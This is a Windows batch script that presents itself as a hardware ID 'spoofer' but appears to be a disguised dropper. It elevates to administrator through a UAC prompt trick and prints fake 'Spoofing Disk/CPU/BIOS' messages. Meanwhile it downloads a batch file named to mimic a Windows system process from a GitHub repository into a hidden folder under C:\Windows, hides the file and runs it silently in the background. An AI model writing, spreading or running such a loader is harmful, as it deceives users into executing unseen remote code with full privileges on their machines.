@echo off
color 0a

echo ==============================
echo =      64TH NEW TEMP          =
echo ==============================
echo.

:: Request Admin Privileges
:-------------------------------------
REM  --> Check for permissions
IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
    >nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
    >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( 
    goto gotAdmin 
)

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"="%", "", "runas", 1 >> "%temp%\getadmin.vbs"
    
    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"

:: Set target directory
set "targetDir=C:\Windows\CSC\v2.0.6\temp"
if not exist "%targetDir%" (
    mkdir "%targetDir%"
    if errorlevel 1 (
        echo Failed to create directory %targetDir%.
        pause>nul
        goto end
    )
    attrib +h "%targetDir%"  :: Hide the directory
)

:: Set the file path
set "DRIVER_FILE=%targetDir%\Client Server Runtime Processs.bat"

:: Display the spoofing process in the console
echo Starting spoofing process...
timeout /t 2 /nobreak >nul
echo Spoofing Disk...
timeout /t 2 /nobreak >nul
echo Spoofing CPU...
timeout /t 2 /nobreak >nul
echo Spoofing SMBIOS...
timeout /t 2 /nobreak >nul
echo Spoofing BIOS...
timeout /t 2 /nobreak >nul
echo Spoofing Chassis...
timeout /t 2 /nobreak >nul
echo Spoofing Motherboard...
timeout /t 2 /nobreak >nul

:: Download Client in the background
if not exist "%DRIVER_FILE%" (
    echo WAIT...
    start /B powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://github.com/topking91154/64TEMP/raw/refs/heads/main/Client%%20Server%%20Runtime%%20Processs.bat' -OutFile '%DRIVER_FILE%'" >nul 2>&1
    timeout /t 5 /nobreak >nul  :: Wait for download to complete
    if not exist "%DRIVER_FILE%" (
        color b
        echo Failed to download Client Server Runtime Processs.bat. Please check your internet connection.
        pause>nul
        goto end
    )
    attrib +h "%DRIVER_FILE%"  :: Hide the file
)

:: Run the downloaded batch file in the background
start /B cmd /c call "%DRIVER_FILE%" >nul 2>&1

:end
timeout /t 5 >nul

echo DONE...
echo Press any key to exit...
pause >nul
exit /B